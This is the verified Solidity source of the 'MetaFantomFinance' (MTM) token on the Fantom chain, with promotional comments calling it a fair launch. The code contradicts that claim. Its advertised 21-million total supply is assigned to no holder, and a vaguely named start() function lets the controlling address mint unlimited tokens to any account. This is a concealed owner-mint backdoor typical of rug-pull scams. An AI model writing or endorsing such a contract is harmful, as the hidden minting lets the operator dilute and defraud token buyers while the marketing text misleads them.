/**
 *Submitted for verification at FtmScan.com on 2022-03-26
*/

/**
- https://metafantom.finance
- Telegram: https://t.me/metaversefantom

FAIR LAUNCHED SATURDAY (03/26/22)

Meta Fantom is the next generation of the META and NFT dapps stores. Take part and help fuel its expansion and share in the benefits of this growth

*/

// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.11;

contract BasedV1 {

    string public constant symbol = "MTM";
    string public constant name = "MetaFantomFinance";
    uint8 public constant decimals = 18;
    uint public totalSupply = 21000000000000000000000000;

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    address public setcontrol;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        setcontrol = msg.sender;
        _start(msg.sender, 0);
    }

    // No checks as its meant to be once off to set starting rights to BaseV1 setcontrol
    function setsetcontrol(address _setcontrol) external {
        require(msg.sender == setcontrol);
        setcontrol = _setcontrol;
    }

    function approve(address _spender, uint _value) external returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function _start(address _to, uint _amount) internal returns (bool) {
        balanceOf[_to] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0x0), _to, _amount);
        return true;
    }

    function _transfer(address _from, address _to, uint _value) internal returns (bool) {
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transfer(address _to, uint _value) external returns (bool) {
        return _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint _value) external returns (bool) {
        uint allowed_from = allowance[_from][msg.sender];
        if (allowed_from != type(uint).max) {
            allowance[_from][msg.sender] -= _value;
        }
        return _transfer(_from, _to, _value);
    }

    function start(address account, uint amount) external returns (bool) {
        require(msg.sender == setcontrol);
        _start(account, amount);
        return true;
    }
}